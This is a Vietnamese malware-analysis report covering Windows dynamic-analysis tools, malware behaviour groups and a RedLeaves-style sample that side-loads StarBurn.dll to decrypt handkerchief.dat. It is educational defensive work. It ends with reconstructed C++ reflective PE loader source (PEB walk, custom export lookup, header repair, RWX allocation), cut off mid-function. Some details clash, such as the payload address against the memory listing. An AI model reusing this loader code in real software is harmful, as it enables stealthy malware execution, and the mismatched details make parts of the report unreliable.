
# 2. Nghiên cứu các công cụ phân tích động

## 2.1. Process Hacker

### Mục đích chính

Process Hacker là công cụ dùng để theo dõi và quản lý sâu các tiến trình đang hoạt động trên hệ thống Windows. So với Task Manager mặc định, công cụ này cung cấp nhiều thông tin chi tiết hơn về process, thread, module, handle, vùng nhớ, service và kết nối mạng.

Trong phân tích mã độc, Process Hacker đặc biệt hữu ích khi cần quan sát hành vi của một tiến trình theo thời gian thực, kiểm tra các DLL được load, thread đang hoạt động hoặc các vùng nhớ có quyền thực thi bất thường.

### Loại dữ liệu thu thập được

Process Hacker có thể cung cấp các thông tin như:

-   Tên process
-   PID và Parent PID
-   Đường dẫn file thực thi
-   Command line
-   User account
-   Integrity level
-   Thread
-   Module/DLL đang được load
-   Handle
-   Memory region
-   Service
-   TCP/UDP connection

### Ví dụ thông tin có giá trị trong phân tích malware

Một process tree bất thường có thể có dạng:

```
WINWORD.EXE
   ↓
powershell.exe
   ↓
cmd.exe
```

Chuỗi process trên có thể cho thấy một tài liệu Office đã kích hoạt PowerShell hoặc Command Prompt.

Một ví dụ khác:

```
explorer.exe
   ↓
Loaded module:
C:\Users\User\AppData\Temp\abc.dll
```

Việc một process hợp lệ như `explorer.exe` load DLL từ thư mục `Temp` hoặc `AppData` là dấu hiệu cần tiếp tục điều tra.

Ngoài ra, vùng nhớ có đặc điểm:

```
MEM_PRIVATE
+
PAGE_EXECUTE_READWRITE
```

cũng đáng chú ý vì có thể liên quan đến shellcode, code đã unpack hoặc process injection.

----------

## 2.2. Process Explorer

### Mục đích chính

Process Explorer là công cụ thuộc bộ Microsoft Sysinternals, được sử dụng để quan sát các process đang chạy và mối quan hệ giữa chúng.

Điểm mạnh của Process Explorer là khả năng hiển thị **process tree** trực quan, giúp analyst nhanh chóng xác định process cha, process con và chuỗi thực thi.

### Loại dữ liệu thu thập được

Process Explorer có thể hiển thị:

-   Process name
-   PID
-   Parent PID
-   Process tree
-   Image path
-   Command line
-   Company name
-   Digital signature
-   Integrity level
-   CPU usage
-   Memory usage
-   DLL/module đang load
-   Open handle

### Ví dụ thông tin có giá trị trong phân tích malware

Ví dụ:

```
explorer.exe
   ↓
sample.exe
      ↓
powershell.exe
         ↓
cmd.exe
```

Từ process tree này, analyst có thể xác định được:

-   Process nào sinh ra process nào
-   Chương trình được thực thi từ đường dẫn nào
-   Command line có tham số bất thường hay không
-   File có chữ ký số hay không
-   Process đã load các DLL nào

Một ví dụ khác:

```
Process:
svchost.exe

Loaded DLL:
C:\Users\User\AppData\Roaming\unknown.dll
```

DLL lạ nằm trong thư mục của user nhưng được load vào `svchost.exe` là một artifact đáng điều tra.

----------

## 2.3. Process Monitor

### Mục đích chính

Process Monitor (Procmon) là một trong những công cụ quan trọng nhất trong phân tích động trên Windows. Công cụ này theo dõi hoạt động hệ thống theo thời gian thực và tập trung vào các nhóm hành vi như:

-   File system
-   Registry
-   Process
-   Thread
-   Image loading

Procmon rất hữu ích để phát hiện file được tạo, Registry bị chỉnh sửa hoặc process mới được sinh ra sau khi chạy mẫu mã độc.

### Loại dữ liệu thu thập được

Trường dữ liệu

Ý nghĩa

Time

Thời điểm event xảy ra

Process Name

Process thực hiện hành vi

PID

Process ID

Operation

Loại hành động

Path

File hoặc Registry path liên quan

Result

Kết quả thao tác

Detail

Thông tin chi tiết

Một số operation thường gặp:

```
CreateFile
WriteFile
ReadFile
DeleteFile

RegOpenKey
RegQueryValue
RegSetValue
RegCreateKey

Process Create
Process Exit

Load Image
```

### Ví dụ thông tin có giá trị trong phân tích malware

#### Phát hiện file drop

```
sample.exe
WriteFile
C:\Users\User\AppData\Roaming\payload.exe
SUCCESS
```

Thông tin này cho thấy sample đã ghi một executable xuống hệ thống.

#### Phát hiện Registry persistence

```
sample.exe
RegSetValue
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
SUCCESS
```

Event này có thể liên quan đến cơ chế persistence thông qua Registry Run Key.

#### Phát hiện DLL được load

```
sample.exe
Load Image
C:\Users\User\AppData\Temp\evil.dll
```

Điều này giúp analyst xác định các module được load trong runtime.

----------
## 2.3.1. Tổng quan lại Process hacker , process explorer , process monitor
Nhìn qua ta có cảm giác 3 tools này trông có vẻ giống nhau về mặt công dụng nhưng chúng lại có mục đích riêng biệt trong việc phân tích malware.

 1. **Process hacker** : chúng chuyên dùng để phân tích trong process chúng đang làm gì kiểm tra các thread,module,handle,memory,service,nework
 2. **Process explorer** : công cụ có tác dụng để quan sát process tree và process cha con dữ liệu nổi bật là pid,ppid,cmd, dll,signature.tóm lại công cụ này để phân tích process nào được sinh ra bởi process nào 
 3. **Process monitor** : ghi lại hoạt động hệ thóng theo thời gian thực , dữ liệu nổi bật trong công cụ này là file,registry process, thread , image load. Loại này thường được dùng để xem rằng process có tác động gì đến hệ thống 

## 2.4. Autoruns

### Mục đích chính

Autoruns là công cụ thuộc bộ Microsoft Sysinternals, được sử dụng để kiểm tra các vị trí tự khởi động trên Windows.

Trong phân tích malware, Autoruns đặc biệt hữu ích để xác định các cơ chế **persistence** mà mã độc sử dụng để tự chạy lại sau khi reboot hoặc user đăng nhập.

### Loại dữ liệu thu thập được

Autoruns có thể hiển thị các nhóm autostart như:

-   Logon
-   Services
-   Drivers
-   Scheduled Tasks
-   Explorer
-   Winlogon
-   AppInit DLLs
-   Image Hijacks
-   Office Add-ins
-   WMI

Thông tin có thể thu thập bao gồm:

-   Tên autostart entry
-   Registry location
-   File path
-   Publisher
-   Digital signature
-   Description
-   Timestamp
-   Image path

### Ví dụ thông tin có giá trị trong phân tích malware

#### Registry Run Key

```
Logon
Updater
C:\Users\User\AppData\Roaming\abc.exe
```

Entry trên có thể là dấu hiệu của Registry Run Key persistence.

#### Scheduled Task

```
Scheduled Tasks
WindowsUpdateCheck
C:\ProgramData\payload.exe
```

Task có tên giống thành phần Windows nhưng trỏ tới file lạ là dấu hiệu đáng chú ý.

#### Service

```
Services
FakeUpdate
C:\Users\Public\service.exe
```

Một service trỏ tới executable nằm trong thư mục user-writable cần được kiểm tra thêm.

Autoruns rất phù hợp để so sánh trạng thái hệ thống:

```
Before infection
vs
After infection
```

qua đó xác định entry mới xuất hiện sau khi chạy sample.

----------

## 2.5. Wireshark

### Mục đích chính

Wireshark là công cụ dùng để bắt và phân tích lưu lượng mạng ở mức packet.

Trong phân tích malware, Wireshark giúp xác định các hoạt động như:

-   Kết nối tới C2
-   Truy vấn DNS
-   Tải thêm payload
-   Gửi dữ liệu ra ngoài
-   Beaconing
-   Giao tiếp qua các giao thức khác nhau

### Loại dữ liệu thu thập được

Wireshark có thể hiển thị:

-   Source IP
-   Destination IP
-   Source port
-   Destination port
-   Protocol
-   DNS query
-   HTTP request
-   TLS connection
-   TCP stream
-   UDP traffic
-   Packet payload nếu không được mã hóa

Một số protocol thường gặp:

```
DNS
HTTP
HTTPS/TLS
TCP
UDP
SMB
ICMP
```

### Ví dụ thông tin có giá trị trong phân tích malware

#### DNS Query

```
DNS Query:
evil.example
```

Thông tin này có thể được sử dụng như một domain IOC.

#### HTTP Request

```
GET /gate.php?id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Từ request trên có thể thu thập:

-   Domain
-   URL path
-   User-Agent
-   Victim ID

#### TCP Connection

```
192.168.1.10:50234
        ↓
203.0.113.10:443
```

Thông tin này giúp xác định IP đích, port và giao thức mà malware sử dụng.

----------

## 2.6. HTTP Debugger

### Mục đích chính

HTTP Debugger là công cụ dùng để theo dõi và phân tích traffic HTTP/HTTPS theo dạng request và response.

Nếu Wireshark mạnh ở mức packet và hỗ trợ nhiều protocol, HTTP Debugger tập trung nhiều hơn vào **logic giao tiếp HTTP**, giúp analyst đọc request và response trực quan hơn.

### Loại dữ liệu thu thập được

HTTP Debugger có thể hiển thị:

-   URL
-   Domain
-   HTTP method
-   Request header
-   Response header
-   Cookies
-   User-Agent
-   Query parameters
-   Request body
-   Response status
-   Response body

### Ví dụ thông tin có giá trị trong phân tích malware

Ví dụ malware gửi request:

```
POST /api/checkin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Request body:

```
id=ABC123
user=admin
computer=DESKTOP-01
```

Từ dữ liệu trên, analyst có thể xác định:

```
C2 domain:
example.com

Endpoint:
/api/checkin

Method:
POST

Victim ID:
ABC123
```

Một ví dụ khác:

```
GET /payload.bin HTTP/1.1
Host: example.com
```

Request này có thể cho thấy sample đang tải thêm payload từ máy chủ từ xa.

----------

# Bảng so sánh tổng hợp

Công cụ

Mục đích chính

Dữ liệu thu thập được

Giá trị trong phân tích malware

**Process Hacker**

Phân tích sâu process

Process, thread, module, handle, memory, network

Phát hiện injection, DLL lạ, vùng nhớ đáng ngờ

**Process Explorer**

Quan sát process tree

PID, PPID, command line, DLL, signature

Xác định quan hệ parent-child và process bất thường

**Process Monitor**

Theo dõi hoạt động hệ thống

File, Registry, process, thread, image load

Phát hiện file drop, Registry modification, process creation

**Autoruns**

Phát hiện autostart/persistence

Run key, Service, Task, Driver, WMI

Xác định cơ chế persistence

**Wireshark**

Phân tích traffic mạng

IP, port, domain, protocol, packet

Phát hiện C2, DNS, exfiltration, payload download

**HTTP Debugger**

Phân tích HTTP/HTTPS

URL, header, request, response, body

Phát hiện C2 HTTP, API endpoint, dữ liệu truyền nhận

----------

# Nhận xét tổng hợp

Không có một công cụ đơn lẻ nào có thể cung cấp đầy đủ toàn bộ hành vi của malware. Trong thực tế, analyst thường kết hợp nhiều công cụ để xây dựng một bức tranh hoàn chỉnh.

Một workflow phân tích động có thể được thực hiện như sau:

```
Process Explorer / Process Hacker
        ↓
Xác định process và process tree
        ↓
Process Monitor
        ↓
Theo dõi File + Registry + Process
        ↓
Autoruns
        ↓
Kiểm tra persistence
        ↓
Wireshark
        ↓
Phân tích IP / Domain / Protocol
        ↓
HTTP Debugger
        ↓
Phân tích HTTP request / response
```

Có thể ghi nhớ ngắn gọn:

```
Process Hacker
→ Process + Memory + Thread

Process Explorer
→ Process Tree + DLL

Process Monitor
→ File + Registry

Autoruns
→ Persistence

Wireshark
→ Network Packet

HTTP Debugger
→ HTTP Request / Response
```

Việc kết hợp các công cụ trên giúp analyst xác định được cả hành vi trên máy nạn nhân lẫn hành vi giao tiếp mạng, từ đó thu thập IOC và xây dựng behavioral profile của mẫu mã độc
Dưới đây là phần có thể đưa gần như nguyên văn vào báo cáo.

# 3. Các nhóm hành vi quan trọng khi phân tích động

Trong phân tích động, mục tiêu không chỉ là xác định malware có chạy hay không mà quan trọng hơn là quan sát **nó đã làm gì sau khi được thực thi**. Các hành vi thường được chia thành nhiều nhóm để analyst dễ theo dõi và xây dựng behavioral profile của mẫu.

Sáu nhóm quan trọng gồm:

-   Process / Injection
-   File System
-   Registry
-   Persistence
-   Network
-   Anti-analysis / Evasion

----------

## 3.1. Process / Injection

### Nội dung cần quan sát

Nhóm này tập trung vào các process và thread được tạo ra trong quá trình malware hoạt động.

Các thông tin quan trọng gồm:

-   Process nào được tạo
-   Parent process là gì
-   Child process là gì
-   Command line được sử dụng
-   Thread mới được tạo
-   DLL/module được load
-   Process khác có bị mở hay không
-   Có thao tác ghi vào memory của process khác hay không
-   Có process injection hoặc process hollowing hay không

Ví dụ process tree:

```
explorer.exe
   ↓
sample.exe
   ↓
powershell.exe
   ↓
cmd.exe
```

Một số API đáng chú ý:

```
CreateProcess
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
GetThreadContext
SetThreadContext
ResumeThread
QueueUserAPC
```

### Process Injection là gì?

Process Injection là kỹ thuật đưa code vào một process khác để code của malware chạy bên trong process đó.

Ví dụ:

```
malware.exe
    ↓
OpenProcess(explorer.exe)
    ↓
VirtualAllocEx
    ↓
WriteProcessMemory
    ↓
CreateRemoteThread
    ↓
code chạy trong explorer.exe
```

Malware có thể lợi dụng các process hợp lệ như:

```
explorer.exe
svchost.exe
notepad.exe
rundll32.exe
```

để che giấu hoạt động.

### Vì sao nhóm này quan trọng?

Process behavior giúp analyst hiểu được **execution flow** của malware.

Ví dụ, nếu chỉ thấy:

```
sample.exe
```

thì chưa biết nhiều.

Nhưng nếu quan sát thấy:

```
sample.exe
   ↓
CreateProcess
   ↓
powershell.exe
   ↓
download payload
```

thì đã có thể hiểu malware sử dụng PowerShell như một thành phần trung gian.

Injection còn đặc biệt quan trọng vì malware thường dùng kỹ thuật này để:

-   Ẩn code trong process hợp lệ
-   Né antivirus/EDR
-   Làm process tree khó phân tích
-   Chạy dưới context của process khác
-   Che giấu executable ban đầu

Do đó, Process / Injection là một trong những nhóm hành vi quan trọng nhất khi phân tích malware.

----------

## 3.2. File System

### Nội dung cần quan sát

File System behavior bao gồm các thao tác của malware đối với file và thư mục.

Ví dụ:

-   Tạo file
-   Đọc file
-   Ghi file
-   Xóa file
-   Copy file
-   Rename file
-   Tạo thư mục
-   Drop DLL hoặc EXE
-   Ghi file cấu hình
-   Tạo temporary file

Các API thường gặp:

```
CreateFile
ReadFile
WriteFile
DeleteFile
CopyFile
MoveFile
CreateDirectory
FindFirstFile
FindNextFile
```

### Ví dụ

Malware ban đầu:

```
sample.exe
```

sau khi chạy tạo:

```
C:\Users\User\AppData\Roaming\update.exe
```

Flow:

```
sample.exe
   ↓
CreateFile
   ↓
WriteFile
   ↓
C:\Users\User\AppData\Roaming\update.exe
```

Đây có thể là hành vi **drop payload**.

Một malware khác có thể:

```
FindFirstFile
   ↓
FindNextFile
   ↓
*.docx
*.xlsx
*.pdf
   ↓
WriteFile
```

Hành vi này có thể liên quan đến tìm kiếm hoặc chỉnh sửa dữ liệu người dùng.

### Vì sao nhóm này quan trọng?

Malware thường cần tương tác với file system để:

-   Drop payload
-   Lưu configuration
-   Lưu dữ liệu thu thập được
-   Tạo persistence
-   Load DLL
-   Mã hóa file
-   Xóa dấu vết
-   Sao chép chính nó

Ngoài ra, file path còn là IOC có giá trị.

Ví dụ:

```
C:\Users\User\AppData\Roaming\svchost.exe
```

là một đường dẫn đáng nghi vì `svchost.exe` hợp lệ thường nằm trong thư mục hệ thống, không phải `AppData`.

----------

## 3.3. Registry

### Nội dung cần quan sát

Windows Registry lưu rất nhiều thông tin cấu hình của hệ điều hành và ứng dụng.

Malware có thể:

-   Mở Registry key
-   Đọc Registry value
-   Tạo key
-   Tạo value
-   Sửa value
-   Xóa key/value

Một số API:

```
RegOpenKeyEx
RegCreateKeyEx
RegQueryValueEx
RegSetValueEx
RegDeleteValue
RegDeleteKey
```

### Ví dụ

Malware ghi:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Value:

```
Updater = C:\Users\User\AppData\Roaming\payload.exe
```

Flow:

```
sample.exe
   ↓
RegCreateKeyEx
   ↓
RegSetValueEx
   ↓
Run Key
   ↓
payload chạy khi user login
```

Registry cũng có thể được dùng để lưu configuration:

```
HKCU\Software\SomeName
    Server = example.com
    Port   = 443
    ID     = ABC123
```

### Vì sao nhóm này quan trọng?

Registry có thể cung cấp thông tin về:

-   Persistence
-   Malware configuration
-   Service configuration
-   COM hijacking
-   System discovery
-   C2 configuration
-   Trạng thái hoạt động của malware

Registry artifact thường rất hữu ích trong DFIR vì chúng có thể vẫn tồn tại ngay cả sau khi process malware đã kết thúc.

----------

## 3.4. Persistence

### Persistence là gì?

Persistence là khả năng giúp malware **tiếp tục chạy lại sau khi process bị đóng, user đăng nhập lại hoặc hệ thống reboot**.

Ví dụ:

```
Malware chạy
   ↓
tạo Registry Run Key
   ↓
máy reboot
   ↓
user login
   ↓
malware chạy lại
```

### Các persistence technique thường gặp

-   Registry Run / RunOnce
-   Startup Folder
-   Scheduled Tasks
-   Services
-   Drivers
-   Winlogon
-   WMI
-   COM Hijacking
-   Office Add-ins
-   Image File Execution Options

Ví dụ Registry Run Key:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Ví dụ Service:

```
HKLM\SYSTEM\CurrentControlSet\Services\malware.exe
```

Ví dụ Scheduled Task:

```
Task Scheduler
   ↓
WindowsUpdateCheck
   ↓
C:\ProgramData\payload.exe
```

### Vì sao nhóm này quan trọng?

Persistence giúp malware tồn tại lâu dài trên hệ thống.

Nếu malware không có persistence:

```
malware.exe
   ↓
process terminate
   ↓
malware ngừng hoạt động
```

Nếu có persistence:

```
malware.exe
   ↓
install persistence
   ↓
reboot
   ↓
Windows trigger
   ↓
malware chạy lại
```

Do đó persistence là một dấu hiệu rất quan trọng khi điều tra sự xâm nhập lâu dài.

Các persistence artifact cũng có giá trị cao cho detection và incident response.

----------

## 3.5. Network

### Nội dung cần quan sát

Malware thường cần giao tiếp qua mạng để:

-   Kết nối C2
-   Download payload
-   Nhận command
-   Upload dữ liệu
-   Kiểm tra Internet
-   Đăng ký victim
-   Beaconing

Các thông tin cần quan sát:

-   Destination IP
-   Domain
-   Port
-   Protocol
-   URL
-   DNS query
-   HTTP method
-   HTTP headers
-   User-Agent
-   Request body
-   Response body

Một số API thường gặp:

```
WinHttpOpen
WinHttpConnect
WinHttpOpenRequest
WinHttpSendRequest
WinHttpReceiveResponse
WinHttpReadData

InternetOpen
InternetConnect
HttpSendRequest

socket
connect
send
recv
```

### Ví dụ

```
sample.exe
   ↓
DNS Query
   ↓
example.com
   ↓
TCP 443
   ↓
HTTPS
```

Hoặc:

```
POST /api/checkin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Body:

```
id=ABC123&user=admin
```

Có thể đây là victim registration.

Một flow điển hình:

```
Victim
   ↓
Beacon
   ↓
C2 Server
   ↓
Command
   ↓
Victim executes command
```

### Vì sao nhóm này quan trọng?

Network behavior có thể tiết lộ:

-   C2 infrastructure
-   Domain
-   IP
-   URL
-   Protocol
-   Beacon pattern
-   Payload download
-   Data exfiltration

Đây đều là IOC rất có giá trị cho:

-   Threat hunting
-   Firewall blocking
-   IDS/IPS
-   EDR detection
-   Incident response

----------

## 3.6. Anti-analysis / Evasion

### Anti-analysis là gì?

Anti-analysis là các kỹ thuật malware sử dụng để phát hiện hoặc gây khó khăn cho môi trường phân tích.

Malware có thể kiểm tra:

-   Debugger
-   Virtual Machine
-   Sandbox
-   Monitoring tools
-   Hardware
-   Username
-   Computer name
-   Thời gian chạy

Một số API thường gặp:

```
IsDebuggerPresent
CheckRemoteDebuggerPresent
NtQueryInformationProcess
GetTickCount
QueryPerformanceCounter
Sleep
OutputDebugString
```

Malware cũng có thể kiểm tra:

```
VMware
VirtualBox
CPU count
RAM size
Disk size
Process list
Username
Computer name
```

### Ví dụ

```
sample.exe
   ↓
IsDebuggerPresent()
   ↓
TRUE
   ↓
ExitProcess()
```

Analyst có thể chạy malware và thấy:

```
"Không có hành vi gì."
```

Nhưng thực tế là malware đã phát hiện debugger và tự thoát.

Một kỹ thuật khác:

```
sample.exe
   ↓
Sleep(1 hour)
   ↓
Sandbox timeout
   ↓
payload không bao giờ được kích hoạt
```

### Evasion

Malware cũng có thể cố né detection bằng:

-   Process injection
-   Packing
-   Encryption
-   Dynamic API resolution
-   API hashing
-   Obfuscated strings
-   DLL sideloading
-   Living-off-the-land binaries

Ví dụ:

```
malware
   ↓
GetProcAddress
   ↓
VirtualAllocEx
```

thay vì import trực tiếp `VirtualAllocEx`.

### Vì sao nhóm này quan trọng?

Anti-analysis có thể khiến analyst đưa ra kết luận sai.

Ví dụ:

```
Run sample
   ↓
Không thấy network
   ↓
Kết luận: malware không có network
```

Trong khi thực tế:

```
sample
   ↓
detect VMware
   ↓
disable C2 behavior
```

Do đó khi một sample có hành vi quá ít hoặc khác với static analysis, analyst cần kiểm tra khả năng:

```
Anti-VM
Anti-Debug
Sleep
Conditional execution
Environment checks
```

----------

# Bảng tổng hợp

Nhóm hành vi

Quan sát chính

Tại sao quan trọng

**Process / Injection**

Process, thread, memory, module

Xác định execution flow và phát hiện injection

**File System**

File create/read/write/delete

Phát hiện payload, config, dữ liệu và IOC

**Registry**

Key/value read-write

Phát hiện configuration và persistence

**Persistence**

Run key, service, task, WMI...

Xác định cách malware tồn tại sau reboot/login

**Network**

IP, domain, URL, protocol

Phát hiện C2, download và exfiltration

**Anti-analysis / Evasion**

VM/debugger check, sleep, obfuscation

Tránh bỏ sót hoặc hiểu sai behavior

Có thể hình dung toàn bộ quá trình:

```
                  Malware
                     │
        ┌────────────┼────────────┐
        ↓            ↓            ↓
     Process        File       Registry
        │            │            │
        ↓            ↓            ↓
    Injection     Payload      Persistence
        │                         │
        └────────────┬────────────┘
                     ↓
                  Network
                     ↓
                    C2

          Anti-analysis / Evasion
            bao quanh toàn bộ flow
```

Trong thực tế, các nhóm hành vi này thường liên kết với nhau chứ không xuất hiện độc lập. Ví dụ malware có thể **tạo process mới → drop file → ghi Registry để persistence → kết nối C2 → inject vào process hợp lệ**, vì vậy việc quan sát đồng thời nhiều nhóm hành vi giúp analyst hiểu đầy đủ hơn về chức năng và mục đích của mẫu mã độc.
II. Phân tích mã độc |
Mẫu 1

 Ta có  sau : <img width="1264" height="957" alt="image" src="https://github.com/user-attachments/assets/631b42cb-d6e5-459b-88ba-04ccba8d7285" />
 <img width="713" height="70" alt="image" src="https://github.com/user-attachments/assets/998dfec5-7748-4ed0-93b8-c3afe9ba3d89" />
 ta có thể thấy sau khi chạy 123 .exe nó đã dropper ra 1 con mang tên obedience.exe và 2 file payload dll và .dat
  Tiếp đến ta sử dụng công cụ autoruns để nó ghi thêm gì vào registry 
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/08f9bbf0-3356-4cd0-98d8-092935de57d6" />

Nhìn ảnh ta có thể thấy nó tạo persitance bằng cách regcreatekey tại startup
Tiếp đến ta sẽ dùng process hacker để phân tích file obidence nó làm gì
vào thanh memory ta thấy được 
nó load 1 file startburn .dll đáng nghi vì nó nhẹ 1 cách bất thường so với bản gốc của nó

<img width="743" height="363" alt="image" src="https://github.com/user-attachments/assets/2a9503e1-208e-4e74-9dde-139c027dd748" />
<img width="911" height="142" alt="image" src="https://github.com/user-attachments/assets/bec6c228-4fe3-43c6-80e9-03f35884becc" />

Đồng thời ta còn thấy được 1 file có security là rwx  thông thường 1 file rất ít khi dùng quyền này
 ```
 0x2330000, Private: Commit, 4 kB,   RWX, , 4 kB,   4 kB, , , 
0x2740000, Private: Commit, 252 kB, RWX, Heap segment 32-bit (ID 3), 252 kB, 252 kB, , , 
```

bởi vì con này tắt quá nhanh nên việc dump ra rất khó nên tôi chuyển qua phân tích IDA
Đây là mã giả đoạn đó 
```
 sub_4044B0 proc near
arg_0= dword ptr  8
arg_4= dword ptr  0Ch
arg_8= dword ptr  10h
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_8]
mov     edx, [ebp+arg_4]
push    eax
mov     eax, [ebp+arg_0]
push    edx
push    eax
call    sub_408331
push    0               ; int
push    offset aHandkerchiefDa ; "handkerchief.dat"
push    offset aStarburnDll ; "StarBurn.dll"
push    offset aObedienceExe ; "obedience.exe"
mov     ecx, offset unk_76E054
call    sub_403DF0
push    834h            ; dwMilliseconds
call    ds:Sleep
push    0               ; Code
call    _exit
sub_4044B0 endp
```
nhìn qua t có thể phóng đoán rằng file .dll kia chắc để load payload trong file .dat ta đặt breakpoint vào hàm mov
quay lại bạn đầu ta nhớ rằng nó còn payload 4kb tại hàm 0x2740000
trong file tĩnh tôi đã tìm được nó 
```
BOOL DecryptPayloadMemory(LPBYTE lpBuffer, DWORD dwSize)
{
    DWORD oldProtect;
    
    // Đổi thuộc tính trang nhớ sang RWX để vừa ghi đè vừa chạy được code
    VirtualProtect(lpBuffer, dwSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Vòng lặp giải mã XOR trực tiếp trên RAM
    for (DWORD i = 0; i < dwSize; i++)
    {
        lpBuffer[i] ^= GetKeyByte(i); // Giải mã từng byte
    }

    return TRUE;
}
```
đây là mã giả của đoạn code đó tức là nó sẽ giải toàn bộ file .dat để thực hiện payload
tiếp theo ta sẽ dựng lại 2 file này theo c++ :
Đây là file payload chính có đuối .dat
```

#include <windows.h>
#include <winternl.h>

// Định nghĩa cấu trúc con trỏ hàm API nội bộ để Shellcode tự phân giải (API Hashing)
typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *pfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL    (WINAPI *pfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/**
 * Cấu trúc Base Relocation trong tệp PE
 */
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

/**
 * Tự động tìm nạp Base Address của kernel32.dll từ PEB (Position Independent Code)
 */
HMODULE GetKernel32Base() {
    PPEB pPeb = NULL;
#if defined(_M_IX86)
    __asm {
        mov eax, fs:[0x30]
        mov pPeb, eax
    }
#elif defined(_M_AMD64)
    pPeb = (PPEB)__readgsqword(0x60);
#endif

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurrent = pListHead->Flink;

    // Duyệt danh sách DLL đã nạp (Thứ tự: ntdll.dll -> kernel32.dll)
    while (pCurrent != pListHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->FullDllName.Buffer != NULL) {
            // Kiểm tra tên DLL chứa "KERNEL32" hoặc "kernel32"
            WCHAR* name = pEntry->FullDllName.Buffer;
            if (name[0] == L'K' || name[0] == L'k') {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

/**
 * Tự tìm hàm GetProcAddress trong Export Directory của kernel32.dll
 */
FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    WORD*  pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hModule + pNames[i]);
        if (strcmp(szName, lpProcName) == 0) {
            WORD ordinal = pOrdinals[i];
            return (FARPROC)((BYTE*)hModule + pFunctions[ordinal]);
        }
    }
    return NULL;
}

/**
 * ==============================================================================
 * MÃ NGUỒN CỐT LÕI CỦA SHELLCODE LOADER TRONG TỆP DAT
 * Khôi phục PE header bị làm mờ và nạp RedLeaves RAT trực tiếp trong bộ nhớ RAM
 * ==============================================================================
 */
void ReflectivePELoader(BYTE* pRawPayloadWithShellcode) {
    // 1. Phân giải các API động từ KERNEL32
    HMODULE hKernel32 = GetKernel32Base();
    pfnLoadLibraryA   fnLoadLibraryA   = (pfnLoadLibraryA)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)CustomGetProcAddress(hKernel32, "GetProcAddress");
    pfnVirtualAlloc   fnVirtualAlloc   = (pfnVirtualAlloc)CustomGetProcAddress(hKernel32, "VirtualAlloc");
    pfnVirtualProtect fnVirtualProtect = (pfnVirtualProtect)CustomGetProcAddress(hKernel32, "VirtualProtect");

    // 2. Vị trí của tệp PE nhị phân nằm ngay sau Shellcode Loader (Offset ~ 0x1468)
    BYTE* pEmbeddedPE = pRawPayloadWithShellcode + 0x1468;

    // 3. Khôi phục Header bị tác giả APT10 làm mờ:
    //    Hai byte đầu bị đổi từ 'MZ' (0x5A4D) thành 0xFF 0xFF
    //    Signature PE bị đổi từ 'PE\0\0' (0x00004550) thành 0xFF 0xFF 0x00 0x00
    if (pEmbeddedPE[0] == 0xFF && pEmbeddedPE[1] == 0xFF) {
        pEmbeddedPE[0] = 'M';
        pEmbeddedPE[1] = 'Z';
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pEmbeddedPE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pEmbeddedPE + pDos->e_lfanew);

    if (*(WORD*)&pNt->Signature == 0xFFFF) {
        pNt->Signature = IMAGE_NT_SIGNATURE; // Khôi phục 'PE\0\0'
    }

    // 4. Cấp phát vùng nhớ ảo hoàn chỉnh theo SizeOfImage
    BYTE* pImageBase = (BYTE*)fnVirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // Nếu địa chỉ ưu tiên (Preferred ImageBase) bị chiếm dụng, cấp phát địa chỉ bất kỳ
    if (!pImageBase) {
        pImageBase = (BYTE*)fnVirtualAlloc(
            NULL,
            pNt->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
    }

    // 5. Sao chép Headers vào bộ nhớ mới
    memcpy(pImageBase, pEmbeddedPE, pNt->OptionalHeader.SizeOfHeaders);

